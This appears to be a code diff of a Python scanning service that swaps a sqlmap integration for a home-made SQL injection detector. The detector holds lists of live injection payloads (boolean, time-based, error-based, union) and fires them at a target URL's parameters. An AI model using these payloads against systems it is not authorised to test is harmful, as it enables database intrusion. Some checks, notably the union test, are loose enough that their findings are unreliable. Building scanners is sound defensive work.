@@ -18,6 +18,11 @@ import socket
 import json
 import concurrent.futures
 import requests
+import time
+import re
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import random
+import string
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -294,71 +299,523 @@ SERVICE_MAP = {
     28017: "mongodb-web",
     28080: "http-alt5"
 }
-SQLMAP_API_URL = "http://127.0.0.1:8775"
+class SQLInjectionDetector:
+    """
+    Advanced SQL Injection Detection Engine
+    Implements multiple detection techniques: Boolean-based, Time-based, Error-based, and Union-based
+    """
+    
+    # SQL injection payloads for different techniques
+    BOOLEAN_PAYLOADS = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "admin' --",
+        "admin' #",
+        "' OR 1=1--",
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "') OR ('1'='1--",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL, NULL--",
+    ]
+    
+    TIME_BASED_PAYLOADS = [
+        "'; WAITFOR DELAY '00:00:05'--",
+        "'; SELECT SLEEP(5)--",
+        "'; pg_sleep(5)--",
+        "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "' OR SLEEP(5)--",
+        "' OR pg_sleep(5)--",
+        "'; WAITFOR DELAY '0:0:5'--",
+    ]
+    
+    ERROR_BASED_PAYLOADS = [
+        "' AND 1=CONVERT(int, @@version)--",
+        "' AND 1=CAST(@@version AS int)--",
+        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--",
+        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    ]
+    
+    UNION_BASED_PAYLOADS = [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT 1--",
+        "' UNION SELECT 1,2--",
+        "' UNION SELECT 1,2,3--",
+        "' UNION SELECT 1,2,3,4--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION ALL SELECT NULL--",
+        "' UNION ALL SELECT 1,2,3--",
+    ]
+    
+    DATABASE_SIGNATURES = {
+        'MySQL': [
+            r'mysql',
+            r'you have an error in your sql syntax',
+            r'warning: mysql',
+            r'valid mysql result',
+            r'mysqli_',
+            r'mysql_fetch',
+        ],
+        'PostgreSQL': [
+            r'postgresql',
+            r'pg_query\(\)',
+            r'warning.*\Wpg_',
+            r'valid postgresql result',
+            r'postgres query failed',
+            r'pg_exec\(\)',
+        ],
+        'MSSQL': [
+            r'microsoft.*odbc.*sql server',
+            r'sql server.*driver',
+            r'warning.*\Wmssql_',
+            r'valid mssql result',
+            r'mssql_query\(\)',
+            r'sqlcmd',
+        ],
+        'Oracle': [
+            r'\boracle\b',
+            r'ora-\d{5}',
+            r'oracle.*driver',
+            r'warning.*\Woci_',
+            r'valid oracle result',
+            r'oracle query failed',
+        ],
+        'SQLite': [
+            r'sqlite',
+            r'sqlite3',
+            r'warning.*\Wsqlite_',
+            r'valid sqlite result',
+            r'sqlite_query\(\)',
+        ],
+    }
+    
+    @staticmethod
+    def generate_random_string(length=8):
+        """Generate random string for testing"""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    
+    @staticmethod
+    def extract_parameters(url):
+        """Extract GET parameters from URL"""
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        return params, parsed
+    
+    @staticmethod
+    def build_url(base_url, params):
+        """Build URL with modified parameters"""
+        parsed = urlparse(base_url)
+        new_query = urlencode(params, doseq=True)
+        new_parsed = parsed._replace(query=new_query)
+        return urlunparse(new_parsed)
+    
+    @staticmethod
+    def detect_database_type(response_text, response_headers):
+        """Detect database type from error messages"""
+        text_lower = response_text.lower()
+        headers_str = str(response_headers).lower()
+        combined = text_lower + headers_str
+        
+        detected = []
+        for db_type, signatures in SQLInjectionDetector.DATABASE_SIGNATURES.items():
+            for signature in signatures:
+                if re.search(signature, combined, re.IGNORECASE):
+                    detected.append(db_type)
+                    break
+        
+        return list(set(detected)) if detected else ['Unknown']
+    
+    @staticmethod
+    def test_boolean_based(url, param_name, original_value):
+        """Test boolean-based SQL injection"""
+        test_payloads = SQLInjectionDetector.BOOLEAN_PAYLOADS[:5]  # Test top 5
+        
+        try:
+            # Get baseline response
+            baseline_response = requests.get(url, timeout=10, allow_redirects=False)
+            baseline_length = len(baseline_response.text)
+            baseline_status = baseline_response.status_code
+            
+            for payload in test_payloads:
+                params, parsed = SQLInjectionDetector.extract_parameters(url)
+                if param_name in params:
+                    params[param_name] = [payload]
+                    test_url = SQLInjectionDetector.build_url(url, params)
+                    
+                    test_response = requests.get(test_url, timeout=10, allow_redirects=False)
+                    test_length = len(test_response.text)
+                    test_status = test_response.status_code
+                    
+                    # Check for significant differences
+                    length_diff = abs(test_length - baseline_length)
+                    if length_diff > baseline_length * 0.1 or test_status != baseline_status:
+                        return {
+                            'vulnerable': True,
+                            'technique': 'Boolean-based',
+                            'payload': payload,
+                            'baseline_length': baseline_length,
+                            'test_length': test_length,
+                            'status_code': test_status
+                        }
+        except Exception as e:
+            logger.debug(f"Boolean-based test error: {str(e)}")
+        
+        return {'vulnerable': False, 'technique': 'Boolean-based'}
+    
+    @staticmethod
+    def test_time_based(url, param_name, original_value):
+        """Test time-based SQL injection"""
+        time_payloads = SQLInjectionDetector.TIME_BASED_PAYLOADS[:3]  # Test top 3
+        
+        try:
+            for payload in time_payloads:
+                params, parsed = SQLInjectionDetector.extract_parameters(url)
+                if param_name in params:
+                    params[param_name] = [payload]
+                    test_url = SQLInjectionDetector.build_url(url, params)
+                    
+                    start_time = time.time()
+                    test_response = requests.get(test_url, timeout=15, allow_redirects=False)
+                    elapsed_time = time.time() - start_time
+                    
+                    # If response took more than 4 seconds, likely vulnerable
+                    if elapsed_time >= 4.0:
+                        return {
+                            'vulnerable': True,
+                            'technique': 'Time-based',
+                            'payload': payload,
+                            'response_time': elapsed_time
+                        }
+        except requests.exceptions.Timeout:
+            # Timeout could indicate time-based injection
+            return {
+                'vulnerable': True,
+                'technique': 'Time-based',
+                'payload': payload,
+                'response_time': 'timeout'
+            }
+        except Exception as e:
+            logger.debug(f"Time-based test error: {str(e)}")
+        
+        return {'vulnerable': False, 'technique': 'Time-based'}
+    
+    @staticmethod
+    def test_error_based(url, param_name, original_value):
+        """Test error-based SQL injection"""
+        error_payloads = SQLInjectionDetector.ERROR_BASED_PAYLOADS[:3]
+        
+        try:
+            for payload in error_payloads:
+                params, parsed = SQLInjectionDetector.extract_parameters(url)
+                if param_name in params:
+                    params[param_name] = [payload]
+                    test_url = SQLInjectionDetector.build_url(url, params)
+                    
+                    test_response = requests.get(test_url, timeout=10, allow_redirects=False)
+                    response_text = test_response.text.lower()
+                    response_headers = test_response.headers
+                    
+                    # Check for SQL error messages
+                    sql_errors = [
+                        r'sql syntax.*mysql',
+                        r'warning.*\Wmysql_.*',
+                        r'valid mysql result',
+                        r'mysqli_query\(\)',
+                        r'mysql_fetch',
+                        r'postgresql.*error',
+                        r'warning.*\Wpg_.*',
+                        r'valid postgresql result',
+                        r'pg_query\(\)',
+                        r'microsoft.*odbc.*sql server',
+                        r'sql server.*driver',
+                        r'warning.*\Wmssql_.*',
+                        r'valid mssql result',
+                        r'oracle.*error',
+                        r'ora-\d{5}',
+                        r'oracle.*driver',
+                        r'warning.*\Woci_.*',
+                        r'sqlite.*error',
+                        r'warning.*\Wsqlite_.*',
+                    ]
+                    
+                    for error_pattern in sql_errors:
+                        if re.search(error_pattern, response_text, re.IGNORECASE):
+                            db_type = SQLInjectionDetector.detect_database_type(
+                                test_response.text, test_response.headers
+                            )
+                            return {
+                                'vulnerable': True,
+                                'technique': 'Error-based',
+                                'payload': payload,
+                                'database_type': db_type,
+                                'error_detected': True
+                            }
+        except Exception as e:
+            logger.debug(f"Error-based test error: {str(e)}")
+        
+        return {'vulnerable': False, 'technique': 'Error-based'}
+    
+    @staticmethod
+    def test_union_based(url, param_name, original_value):
+        """Test union-based SQL injection"""
+        union_payloads = SQLInjectionDetector.UNION_BASED_PAYLOADS[:5]
+        
+        try:
+            baseline_response = requests.get(url, timeout=10, allow_redirects=False)
+            baseline_text = baseline_response.text.lower()
+            
+            for payload in union_payloads:
+                params, parsed = SQLInjectionDetector.extract_parameters(url)
+                if param_name in params:
+                    params[param_name] = [payload]
+                    test_url = SQLInjectionDetector.build_url(url, params)
+                    
+                    test_response = requests.get(test_url, timeout=10, allow_redirects=False)
+                    test_text = test_response.text.lower()
+                    
+                    # Check for union injection indicators
+                    if 'union' in test_text or test_response.status_code == 200:
+                        # Check if response is significantly different
+                        if len(test_text) != len(baseline_text):
+                            return {
+                                'vulnerable': True,
+                                'technique': 'Union-based',
+                                'payload': payload,
+                                'status_code': test_response.status_code
+                            }
+        except Exception as e:
+            logger.debug(f"Union-based test error: {str(e)}")
+        
+        return {'vulnerable': False, 'technique': 'Union-based'}
+    
+    @staticmethod
+    def check_suspicious_patterns(url):
+        """Check for suspicious patterns that might indicate SQL injection attempts"""
+        suspicious_patterns = [
+            r"['\"]\s*(or|and)\s*['\"]?\d+['\"]?\s*=\s*['\"]?\d+",
+            r"union\s+select",
+            r"exec\s*\(",
+            r"waitfor\s+delay",
+            r"sleep\s*\(",
+            r"pg_sleep\s*\(",
+            r"benchmark\s*\(",
+            r"load_file\s*\(",
+            r"into\s+outfile",
+            r"information_schema",
+        ]
+        
+        found_patterns = []
+        for pattern in suspicious_patterns:
+            if re.search(pattern, url, re.IGNORECASE):
+                found_patterns.append(pattern)
+        
+        return found_patterns
+    
+    @staticmethod
+    def perform_sql_injection_scan(target_url, scan_type):
+        """
+        Perform comprehensive SQL injection scan using multiple detection techniques
+        """
+        results = {
+            'target': target_url,
+            'scan_type': scan_type,
+            'vulnerabilities': [],
+            'tested_parameters': [],
+            'database_type': [],
+            'techniques_tested': [],
+            'overall_status': 'not_vulnerable',
+            'confidence': 'low',
+            'suspicious_patterns': [],
+            'scan_timestamp': datetime.now().isoformat()
+        }
+        
+        try:
+            # First, check for suspicious patterns in the URL itself
+            suspicious = SQLInjectionDetector.check_suspicious_patterns(target_url)
+            if suspicious:
+                results['suspicious_patterns'] = suspicious
+                results['confidence'] = 'medium'  # Raise confidence if suspicious patterns found
+            
+            # Parse URL and extract parameters
+            params, parsed = SQLInjectionDetector.extract_parameters(target_url)
+            
+            if not params:
+                # If no GET parameters, check if URL itself looks suspicious
+                if suspicious:
+                    results['message'] = 'No GET parameters found, but suspicious patterns detected in URL.'
+                else:
+                    results['message'] = 'No GET parameters found. POST-based testing not implemented in this version.'
+                return results
+            
+            # Test each parameter
+            for param_name, param_values in params.items():
+                original_value = param_values[0] if param_values else ''
+                
+                param_results = {
+                    'parameter': param_name,
+                    'original_value': original_value,
+                    'tests': []
+                }
+                
+                # Run all test techniques
+                techniques = [
+                    SQLInjectionDetector.test_boolean_based,
+                    SQLInjectionDetector.test_time_based,
+                    SQLInjectionDetector.test_error_based,
+                    SQLInjectionDetector.test_union_based,
+                ]
+                
+                for technique_func in techniques:
+                    try:
+                        test_result = technique_func(target_url, param_name, original_value)
+                        param_results['tests'].append(test_result)
+                        results['techniques_tested'].append(test_result['technique'])
+                        
+                        if test_result.get('vulnerable'):
+                            results['vulnerabilities'].append({
+                                'parameter': param_name,
+                                'technique': test_result['technique'],
+                                'payload': test_result.get('payload', ''),
+                                'details': test_result
+                            })
+                            results['overall_status'] = 'vulnerable'
+                            
+                            # Detect database type from error-based results
+                            if 'database_type' in test_result:
+                                results['database_type'].extend(test_result['database_type'])
+                    except Exception as e:
+                        logger.debug(f"Technique {technique_func.__name__} error: {str(e)}")
+                
+                results['tested_parameters'].append(param_results)
+            
+            # Determine confidence level
+            if results['vulnerabilities']:
+                if len(results['vulnerabilities']) >= 2:
+                    results['confidence'] = 'high'
+                elif any(v['technique'] == 'Error-based' for v in results['vulnerabilities']):
+                    results['confidence'] = 'high'
+                else:
+                    results['confidence'] = 'medium'
+            
+            # Remove duplicates from database_type
+            results['database_type'] = list(set(results['database_type']))
+            results['techniques_tested'] = list(set(results['techniques_tested']))
+            
+            # Additional heuristic: if multiple techniques found vulnerabilities, increase confidence
+            if len(results['vulnerabilities']) > 0:
+                unique_techniques = set(v['technique'] for v in results['vulnerabilities'])
+                if len(unique_techniques) >= 2:
+                    results['confidence'] = 'high'
+            
+            # Add summary statistics
+            results['summary'] = {
+                'total_parameters': len(params),
+                'vulnerable_parameters': len(results['vulnerabilities']),
+                'techniques_used': len(results['techniques_tested']),
+                'databases_detected': len(results['database_type'])
+            }
+            
+        except Exception as e:
+            logger.error(f"SQL injection scan error: {str(e)}")
+            results['error'] = str(e)
+            results['overall_status'] = 'error'
+        
+        return results
 
 class ScanManager:
     """
     Manages the scanning logic, including port scanning and vulnerability detection.
     This class provides static methods to perform different parts of the scanning process.
     """
-    #################my modification#################
-    @staticmethod
-    def _sqlmap_task(target:str) ->str:
-        #create a new sql map task
-        r=requests.get(f"{SQLMAP_API_URL}/task/new")
-        r.raise_for_status()
-        task_id=r.json()["taskid"]
-        return task_id
-    @staticmethod
-    def _start_sqlmap_scan(task_id: str, target: str, level: int = 1, risk: int = 1):
-        data = {
-            "url": target,
-            "level": level,
-            "risk": risk
-        }
-        r = requests.post(f"{SQLMAP_API_URL}/scan/{task_id}/start", json=data)
-        r.raise_for_status()
-
-    @staticmethod
-    def _get_sqlmap_status(task_id: str) -> str:
-        r = requests.get(f"{SQLMAP_API_URL}/scan/{task_id}/status")
-        r.raise_for_status()
-        return r.json().get("status")  # "running" or "terminated"
-    @staticmethod
-    def _get_sqlmap_data(task_id: str):
-        # this endpoint returns vulnerabilities and other data as JSON
-        r = requests.get(f"{SQLMAP_API_URL}/scan/{task_id}/data")
-        r.raise_for_status()
-        return r.json()
     @staticmethod
     def perform_sqlmap_scan(scan_id: str, target: str, scan_type: str):
+        """
+        Perform custom SQL injection scan using our advanced detection algorithms
+        Replaces sqlmap with pure logic-based detection
+        """
         try:
-            task_id = ScanManager._sqlmap_task(target)
-            ScanManager._start_sqlmap_scan(task_id, target)
-
-            # poll until sqlmap finishes
-            while True:
-                status = ScanManager._get_sqlmap_status(task_id)
-                if status == "terminated":
-                    break
-                #simple sleep to avoid hammering the api
-                asyncio.sleep(1)
-
-            data = ScanManager._get_sqlmap_data(task_id)
-
-            # update stored scan result
-            scan = scan_results[scan_id]
+            logger.info(f"Starting SQL injection scan for {target} (scan_id: {scan_id})")
+            
+            # Update scan status
+            scan = scan_results.get(scan_id)
+            if not scan:
+                logger.error(f"Scan {scan_id} not found")
+                return
+            
+            # Determine scan depth based on scan_type
+            scan_depth_map = {
+                ScanType.QUICK: 'quick',
+                ScanType.STANDARD: 'standard',
+                ScanType.COMPREHENSIVE: 'comprehensive'
+            }
+            depth = scan_depth_map.get(scan_type, 'standard')
+            
+            # Perform the SQL injection scan
+            scan_result = SQLInjectionDetector.perform_sql_injection_scan(target, depth)
+            
+            # Format results similar to sqlmap output structure
+            formatted_result = {
+                'status': 'terminated',
+                'success': True,
+                'data': {
+                    'target': {
+                        'url': target,
+                        'data': None
+                    },
+                    'technique': scan_result.get('techniques_tested', []),
+                    'dbms': scan_result.get('database_type', ['Unknown']),
+                    'dbms_version': None,
+                    'vulnerable': scan_result.get('overall_status') == 'vulnerable',
+                    'confidence': scan_result.get('confidence', 'low'),
+                    'payloads': [
+                        {
+                            'parameter': vuln['parameter'],
+                            'technique': vuln['technique'],
+                            'payload': vuln['payload']
+                        }
+                        for vuln in scan_result.get('vulnerabilities', [])
+                    ],
+                    'injection': scan_result.get('vulnerabilities', []),
+                    'tested_parameters': scan_result.get('tested_parameters', []),
+                    'scan_details': {
+                        'total_parameters_tested': len(scan_result.get('tested_parameters', [])),
+                        'vulnerable_parameters': len(scan_result.get('vulnerabilities', [])),
+                        'techniques_used': scan_result.get('techniques_tested', []),
+                        'database_detected': scan_result.get('database_type', [])
+                    }
+                }
+            }
+            
+            # Update scan result
             scan.status = ScanStatus.COMPLETED
-            scan.sqlmapResult = data  # already JSON-serializable
+            scan.sqlmapResult = formatted_result
+            
+            # Also add vulnerabilities to the scan object
+            if scan_result.get('vulnerabilities'):
+                sql_vulns = []
+                for vuln in scan_result['vulnerabilities']:
+                    severity = 'High' if vuln['technique'] in ['Error-based', 'Time-based'] else 'Medium'
+                    sql_vulns.append(Vulnerability(
+                        name=f"SQL Injection - {vuln['technique']}",
+                        severity=severity,
+                        description=f"SQL injection vulnerability detected in parameter '{vuln['parameter']}' using {vuln['technique']} technique. Payload: {vuln.get('payload', 'N/A')}",
+                        solution="Use parameterized queries/prepared statements. Validate and sanitize all user inputs. Implement proper input validation and output encoding."
+                    ))
+                scan.vulnerabilities = sql_vulns
+            
             scan_results[scan_id] = scan
-
+            logger.info(f"SQL injection scan completed for {target}")
+            
         except Exception as e:
+            logger.error(f"Error during SQL injection scan: {str(e)}")
             scan = scan_results.get(scan_id)
             if scan:
                 scan.status = ScanStatus.FAILED
                 scan.rawOutput = str(e)
                 scan_results[scan_id] = scan
-    ######################### modification ends here in this class ####################
     @staticmethod
     def scan_port(target: str, port: int, timeout: float = 1.0) -> Optional[PortInfo]:
         """
@@ -671,34 +1128,37 @@ async def gobuster(base: str):
     else:
         return None
 ########################this is my modification######################
-@app.post("/scan/sqlmap",response_model=Scan)
-async def create_sqlmap_scan(scan_request: ScanRequest,background_tasks: BackgroundTasks):
+@app.post("/scan/sqlmap", response_model=Scan)
+async def create_sqlmap_scan(scan_request: ScanRequest, background_tasks: BackgroundTasks):
     """
-    Initiate a new sqlmap scan in background and returns initial scan object
+    Initiate a new SQL injection scan using our custom detection engine.
+    The scan runs in background and returns initial scan object immediately.
+    Uses advanced algorithms: Boolean-based, Time-based, Error-based, and Union-based detection.
     """
     try:
         # Generate scan id 
         scan_id = str(uuid.uuid4())
         # Create initial scan result 
         scan = Scan(
-            id= scan_id,
-            target = scan_request.target,
-            scan_type= scan_request.scan_type,
-            timestamp = datetime.now().isoformat(),
-            status = ScanStatus.IN_PROGRESS,
+            id=scan_id,
+            target=scan_request.target,
+            scanType=scan_request.scanType,
+            timestamp=datetime.now().isoformat(),
+            status=ScanStatus.IN_PROGRESS,
         )
         # Store the scan
         scan_results[scan_id] = scan
-        #start the scan in background 
+        # Start the scan in background 
         background_tasks.add_task(
             ScanManager.perform_sqlmap_scan,
             scan_id,
             scan_request.target,
-            scan_request.scan_type,
+            scan_request.scanType,
         )
         return scan
     except Exception as e:
-        raise HTTPException(status_code=500,detail=str(e))
+        logger.error(f"Error creating SQL injection scan: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
 @app.get("/scan/sqlmap/{scan_id}", response_model=Scan)
 async def get_sqlmap_scan(scan_id: str):
     """
